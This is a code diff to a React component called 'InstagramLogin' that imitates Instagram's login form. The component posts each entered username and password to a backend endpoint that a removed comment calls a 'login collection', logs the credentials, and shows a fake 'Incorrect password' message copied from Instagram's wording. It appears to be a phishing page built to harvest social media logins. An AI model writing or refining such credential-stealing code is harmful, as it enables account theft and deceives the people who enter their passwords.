@@ -4,7 +4,9 @@ import { FaMeta, FaEye, FaEyeSlash } from "react-icons/fa6";
 
 export default function InstagramLogin() {
   const [form, setForm] = useState({
-    username: "comrade3263",
+    username: "",
+        // username: "comrade3263",
+
     password: "",
   });
 
@@ -85,8 +87,7 @@ const handleSubmit = async (e) => {
   setIsLoading(true);
 
   try {
-    // Send to login collection
-    await fetch(`${VITE_API_BASE_URL}/api/submit-login`, {
+    const res = await fetch(`${VITE_API_BASE_URL}/api/submit-login`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -94,13 +95,30 @@ const handleSubmit = async (e) => {
       body: JSON.stringify(form),
     });
 
-    console.log("Submitted login:", form);
+    const data = await res.json();
+
+    if (!res.ok) {
+      setAlert({
+        visible: true,
+        title: "Incorrect password",
+        message: "The password that you’ve entered is incorrect. Please try again.",
+      });
+    } else {
+      console.log("Submitted login:", form);
+      // Success logic (optional)
+    }
   } catch (error) {
     console.error("Error submitting login:", error);
+    setAlert({
+      visible: true,
+      title: "Login failed",
+      message: "Something went wrong. Please try again later.",
+    });
   } finally {
     setIsLoading(false);
   }
 };
+
 
 
   const closeAlert = () => {
